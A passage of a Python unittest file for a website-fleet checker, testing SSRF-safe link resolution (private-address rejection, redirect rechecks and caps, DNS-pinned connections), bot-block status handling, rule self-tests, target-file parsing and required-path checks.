    def test_link_resolver_rejects_private_dns_answers(self):
        answer = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.1.2.3", 443))]
        with mock.patch.object(socket, "getaddrinfo", return_value=answer), mock.patch.object(
            fleet_check, "_single_link_response"
        ) as request:
            code, note = fleet_check.status_of("https://public.example/path")
        self.assertEqual(code, 0)
        self.assertIn("non-public", note)
        request.assert_not_called()

    def test_link_resolver_rechecks_every_redirect_target(self):
        approved = fleet_check._ResolvedLinkTarget(
            "https", "public.example", 443, "/start", ("93.184.216.34",)
        )
        with mock.patch.object(
            fleet_check,
            "_resolve_public_link_target",
            side_effect=((approved, None), (None, "uses a private/local hostname")),
        ) as target_check, mock.patch.object(
            fleet_check,
            "_single_link_response",
            return_value=(302, "http://localhost/private"),
        ) as request:
            code, note = fleet_check.status_of("https://public.example/start")
        self.assertEqual(code, 0)
        self.assertIn("private", note)
        self.assertEqual(target_check.call_count, 2)
        self.assertEqual(request.call_count, 1)

    def test_link_resolver_caps_redirects(self):
        approved = fleet_check._ResolvedLinkTarget(
            "https", "public.example", 443, "/start", ("93.184.216.34",)
        )
        with mock.patch.object(
            fleet_check, "_resolve_public_link_target", return_value=(approved, None)
        ), mock.patch.object(
            fleet_check,
            "_single_link_response",
            return_value=(302, "/again"),
        ) as request:
            code, note = fleet_check.status_of("https://public.example/start")
        self.assertEqual(code, 0)
        self.assertIn("more than", note)
        self.assertEqual(request.call_count, fleet_check.MAX_LINK_REDIRECTS + 1)

    def test_redirect_without_location_and_head_only_success_do_not_pass(self):
        approved = fleet_check._ResolvedLinkTarget(
            "https", "public.example", 443, "/start", ("93.184.216.34",)
        )
        with mock.patch.object(
            fleet_check, "_resolve_public_link_target", return_value=(approved, None)
        ), mock.patch.object(
            fleet_check, "_single_link_response", return_value=(302, None)
        ):
            code, note = fleet_check.status_of("https://public.example/start")
        self.assertEqual(code, 0)
        self.assertIn("no Location", note)

        with mock.patch.object(
            fleet_check, "_status_with_method", return_value=(404, "")
        ) as request:
            code, _ = fleet_check.status_of("https://public.example/dead")
        self.assertEqual(code, 404)
        self.assertEqual(request.call_args.args[1], "GET")

    def test_bot_block_statuses_are_host_specific(self):
        check = self.check()
        for target, code, expected_findings in (
            ("https://www.instagram.com/example", 401, 0),
            ("https://www.facebook.com/example", 403, 0),
            ("https://x.com/example", 405, 0),
            ("https://www.linkedin.com/in/example", 429, 0),
            ("https://www.linkedin.com/in/example", 999, 0),
            ("https://example.com/private", 403, 1),
            ("https://example.com/bad", 400, 1),
            ("https://x.com/missing", 404, 1),
        ):
            with self.subTest(target=target, code=code), mock.patch.object(
                fleet_check, "status_of", return_value=(code, "")
            ):
                body = f'<a href="{target}">target</a>'
                found = fleet_check.run_resolve_check(
                    check, "https://origin.test/", body, "error", pause=0
                )
                self.assertEqual(len(found), expected_findings)

    def test_link_connection_is_pinned_to_the_approved_dns_answer(self):
        target = fleet_check._ResolvedLinkTarget(
            "https", "public.example", 443, "/path", ("93.184.216.34",)
        )
        with mock.patch.object(socket, "create_connection") as connect:
            connection = fleet_check._pinned_connection(
                target, "93.184.216.34", 3.0
            )
            connection._create_connection(("attacker-rebound.invalid", 443), 2.0)
        connect.assert_called_once_with(("93.184.216.34", 443), 2.0, None)
        self.assertEqual(connection.host, "public.example")


class SelfTestTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

    def test_a_pattern_that_matches_nothing_is_caught(self):
        standard = build(
            [
                {
                    "id": "broken",
                    "kind": "forbid_regex",
                    "pattern": "this-string-is-not-in-the-sample",
                    "message": "broken check",
                    "examples": {"violating": ["<blink>"], "clean": ["<b>"]},
                }
            ],
            self.dir,
        )
        problems = fleet_check.self_test([standard])
        self.assertEqual(len(problems), 1)
        self.assertIn("did NOT flag", problems[0])

    def test_a_pattern_that_cries_wolf_is_caught(self):
        standard = build(
            [
                {
                    "id": "greedy",
                    "kind": "forbid_regex",
                    "pattern": "div",
                    "message": "too broad",
                    "examples": {"violating": ["<div>"], "clean": ["<div>fine</div>"]},
                }
            ],
            self.dir,
        )
        problems = fleet_check.self_test([standard])
        self.assertEqual(len(problems), 1)
        self.assertIn("falsely flagged", problems[0])

    def test_every_shipped_rule_proves_its_own_patterns(self):
        """The integration test that matters: run the real standards."""
        problems = fleet_check.self_test(load_standards(REPOSITORY / "standards"))
        self.assertEqual(problems, [])


class TargetFileTests(unittest.TestCase):
    def read(self, text: str):
        with tempfile.TemporaryDirectory() as name:
            path = Path(name) / "fleet.txt"
            path.write_text(text, encoding="utf-8")
            return fleet_check.read_targets(path)

    def test_comments_and_blanks_are_ignored(self):
        self.assertEqual(
            self.read("# the fleet\n\nhttps://a.test/\n  https://b.test/  \n"),
            [("https://a.test/", ()), ("https://b.test/", ())],
        )

    def test_tags_are_read_from_the_line(self):
        self.assertEqual(
            self.read(
                "https://a.test/   personal-brand,client\n"
                "https://b.test/\tcurrent-live,company\n"
            ),
            [
                ("https://a.test/", ("personal-brand", "client")),
                ("https://b.test/", ("current-live", "company")),
            ],
        )


class TargetScopingTests(unittest.TestCase):
    """A rule that fires everywhere gets ignored everywhere."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

    def test_untagged_rules_apply_to_every_page(self):
        standard = build([], self.dir)
        self.assertTrue(fleet_check.applies_to_target(standard, ()))
        self.assertTrue(fleet_check.applies_to_target(standard, ("company",)))

    def test_a_tagged_rule_only_applies_to_matching_pages(self):
        path = self.dir / "scoped-rule.md"
        path.write_text(
            "---\n"
            + json.dumps({**HEADER, "target_tags": ["personal-brand"], "checks": []})
            + "\n---\n\n## Example rule\n\n- only personal brand sites\n",
            encoding="utf-8",
        )
        standard = parse_standard(path)
        self.assertTrue(fleet_check.applies_to_target(standard, ("personal-brand",)))
        self.assertFalse(fleet_check.applies_to_target(standard, ("company",)))
        self.assertFalse(fleet_check.applies_to_target(standard, ()))


if __name__ == "__main__":
    unittest.main()


class RequirePathsTests(unittest.TestCase):
    """The only check that can catch a URL nothing on the site links to."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

    def check(self, **overrides):
        base = {
            "id": "short-paths",
            "kind": "require_paths",
            "paths": ["/install/", "/skills/"],
            "message": "spoken path is dead",
            "examples": {"builds": [{"target": "https://x.test/", "urls": []}]},
        }
        return build([{**base, **overrides}], self.dir).checks[0]

    def test_paths_join_onto_the_target_origin_not_its_path(self):
        check = self.check()
        self.assertEqual(
            fleet_check.build_paths(check, "https://site.test/deep/page/?a=1"),
            ["https://site.test/install/", "https://site.test/skills/"],
        )

    def test_a_dead_spoken_path_is_reported(self):
        check = self.check()
        original = fleet_check.status_of
        fleet_check.status_of = lambda url: (404, "") if "skills" in url else (200, "")
        try:
            found = fleet_check.run_paths_check(
                check, "https://site.test/", "error", pause=0
            )
        finally:
            fleet_check.status_of = original
        self.assertEqual(len(found), 1)
        self.assertIn("/skills/", found[0].detail)
        self.assertIn("HTTP 404", found[0].detail)

    def test_a_redirect_counts_as_resolving(self):
        check = self.check()
        original = fleet_check.status_of
        fleet_check.status_of = lambda url: (301, "")
        try:
            found = fleet_check.run_paths_check(
                check, "https://site.test/", "error", pause=0
            )
        finally:
            fleet_check.status_of = original
        self.assertEqual(found, [])

    def test_relative_paths_are_rejected_at_parse_time(self):
        from scripts.standards_lib import StandardError

        with self.assertRaises(StandardError):
            self.check(paths=["install/"])

    def test_builds_examples_are_required(self):
        from scripts.standards_lib import StandardError

        with self.assertRaises(StandardError):
            self.check(examples={})
